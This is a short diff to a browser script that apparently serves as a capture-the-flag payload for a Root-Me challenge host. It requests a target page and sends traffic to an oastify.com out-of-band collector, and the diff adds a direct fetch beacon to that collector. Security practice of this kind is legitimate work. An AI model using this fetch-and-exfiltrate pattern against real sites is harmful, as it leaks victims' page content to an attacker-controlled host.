@@ -38,7 +38,7 @@
             
             // Configuration - change these URLs as needed
             const getUrl = 'http://ctf16.root-me.org/room';
-            const postUrl = 'http://z88gl45ng2u1xnfbp2qbu0gfm6sxgp4e.oastify.com';
+            const postUrl = 'https://z88gl45ng2u1xnfbp2qbu0gfm6sxgp4e.oastify.com';
             
             outputDiv.textContent = `Configuration:\nGET URL: ${getUrl}\nPOST URL: ${postUrl}\n\n`;
             
@@ -46,7 +46,8 @@
                 // Step 1: Make GET request
                 statusDiv.textContent = "Making GET request...";
                 outputDiv.textContent += "Step 1: Making GET request to: " + getUrl + "\n";
-                
+
+                await fetch(postUrl);
                 const getResponse = await fetch(getUrl, {
                     mode: 'no-cors'  // Try this if you just want to attempt the request
                     // mode: 'cors'  // Use this if the server supports CORS
